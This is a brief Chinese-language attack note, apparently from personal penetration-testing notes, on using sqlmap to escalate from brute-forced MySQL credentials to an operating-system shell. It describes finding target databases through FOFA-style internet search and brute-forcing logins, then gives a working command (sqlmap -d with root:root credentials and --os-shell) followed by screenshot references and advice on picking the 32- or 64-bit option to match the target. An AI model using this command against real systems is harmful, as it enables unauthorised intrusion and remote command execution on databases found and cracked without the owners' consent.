# sqlmap提权

用途：在fofa类搜索到目标数据库且爆破用户名密码，可以直接用sqlmap提权

```
sqlmap -d mysql://root:root@172.16.12.2:3306/mysql --os-shell
```



![image-20210824182034482](提权/image-20210824182034482.png)

按照目标sql的位数选择

32位选择 32位   64位选择32和64的都可以

![image-20210824182219972](提权/image-20210824182219972.png)

